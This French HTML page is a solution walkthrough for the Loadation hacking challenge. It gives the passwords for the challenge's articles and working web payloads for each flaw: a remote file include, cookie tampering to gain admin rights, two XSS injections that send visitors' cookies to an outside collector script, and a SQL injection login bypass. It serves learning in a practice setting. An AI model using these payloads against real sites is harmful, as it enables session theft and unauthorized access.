<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Document sans titre</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#000000" text="#FFFFFF" link="#FFFFFF" vlink="#FFFFFF" alink="#FFFFFF">
<div align="center">
  <h1>Challenge Loadation : (soluce)
    <br>
</h1>
</div>
<p>Dans le challenge il y a 5 failles + les 4 articles + 3 Questionnaires<br>
  (Hacker, cryptologie, Social Engineering)</p>
<p>Les Articles:<br>
  Pour tout les articles, il est n&eacute;cessaire de t&eacute;l&eacute;charger
  la page (fichier&gt;enregistrer sous)<br>
  Pour trouver les mots de passes, il faut rechercher la variable &quot;password&quot; dans
  la source.</p>
<p>Article 1:<br>
  Dans la source,<br>
  On trouve que la valeur de la variable du mot de passe est: hAcK%E9<br>
  Mais il y a la fonction &#8216;unescape&#8217; avant,ce qui signifie qu'il
  y a de l'hexad&eacute;cimal!!<br>
  En hexad&eacute;cimal %E9 &eacute;quivaut au caract&egrave;re &quot;&eacute;&quot;<br>
  Donc on comprend tout de suite que le mot de passe est: hAcK&eacute;</p>
<p>Article 2:<br>
  Dans la source,<br>
  On voit que la valeur de la variable est un javascript.<br>
  Donc pour avoir le mot de passe il faut allez voir ce javascript<br>
  On ouvre donc le javascript, et on voit que le mot de passe est: maudepasse</p>
<p>Article 3:<br>
  Pareil que l'article 2 sauf que le mot de passe est crypt&eacute; en nombres
  d&eacute;cimaux<br>
  Le mot de passe d&eacute;crypt&eacute; est: loadarticle</p>
<p>Article 4:<br>
  Dans la page de l'article 4, on remarque que l&agrave; o&ugrave; l'on tape
  le mot de passe est un Flash.<br>
  On va donc chercher ce que contient ce flash et plus pr&eacute;cis&eacute;ment
  le mot de passe de ce <br>
  Flash. Pour voir la source du flash, il faut utiliser un logiciel (dispo sur
  loadation) qui<br>
  permet de voir la source (les 20-25 premieres lignes suffisent).<br>
  On a donc la source sous les yeux, et on remarque que le mot de passe du flash
  est: chirac</p>
<p><br>
  Voil&agrave; pour les articles...</p>
<p><br>
  Les Failles:</p>
<p>La Faille include:</p>
<p>Cette faille &eacute;tant tr&egrave;s facile, je n'expliquerai pas en d&eacute;tail.<br>
  L'url du challenge est: http://www.loadation.net/challenges/page.php?<br>
  On inclut notre page: http://www.loadation.net/challenges/page.php?p=http://www.lol.com/hack.txt<br>
  Voil&agrave; pour l'include... (voir tutoriaux si incompr&eacute;hension)</p>
<p><br>
  Faille admin des news:</p>
<p>Celle-ci est l&eacute;g&egrave;rement plus dur que la pr&eacute;c&eacute;dente,
  mais elle reste de niveau &quot;basique&quot;<br>
  Tr&egrave;s peu de d&eacute;tail sera donn&eacute; a l'explication (les tutoriaux
  sont fait pour &ccedil;a!!)<br>
  On tape un mot de passe au hasard, et on obtient un acc&egrave;s refus&eacute;.
  (pas obligatoire mais recommand&eacute;).<br>
  On va sur l'url, et on tape: javascript:alert(document.cookie)<br>
  on voit: admin_news=false ;login=xxx;pass=xxx;<br>
  il suffit donc de mettre admin_news=true!!<br>
  pour faire cela,on fait: javascript:document.cookie=&quot;admin_news=true&quot;;<br>
  On tape n'importe quel mot de passe...Hop par magie on est connecter!!!<br>
  voila pour les news...</p>
<p>Failles xss (2) :</p>
<p>Faille du livre d'or:<br>
  Cette faille est du a l'autorisation du BBcode dans le livre d'or.<br>
  L&agrave; o&ugrave; l'on tape le message, il suffit de mettre:<br>
  [img]javascript:window.open('http://www.tonsite.fr/recup.php?cookie='+document.cookie)[/img]<br>
  ( ce qui a pour effet de r&eacute;cup&eacute;rer les cookies des visiteurs)</p>
<p>Faille chatbox:<br>
  Cette faille m'a &eacute;t&eacute; assez dur a trouver :\,mais en cherchant
  bien,on trouve :)<br>
  L&agrave; o&ugrave; l'on met notre email sur la chatbox,il suffit de mettre:<br>
&quot;
  onmouseover=&quot;window.open('http://www.tonsite.fr/recup.php?cookie='+document.cookie)<br>
  ( ce qui a pour effet de r&eacute;cup&eacute;rer les cookies des visiteurs)</p>
<p>voil&agrave; pour les failles xss...</p>
<p>Failles admin:<br>
  C'est une faille d'injection Mysql.<br>
  rappel: l'injection Mysql consiste a renvoyer toujours vrai.<br>
  Il suffit donc de faire en sorte que le login renvoi &laquo; vrai &raquo; et
  que le mot de passe renvoi lui aussi &laquo; vrai &raquo;<br>
  Pour le login, on mettra donc quelque chose qui est vrai EN langage mysql ainsi
  que pour le mot de passe !!<br>
  On tapera donc pour le login : '' OR 'a'='a' <br>
  Et le mot de passe : '' OR 'a'='a' <br>
(les '' sont a mettre)</p>
</body>
</html>
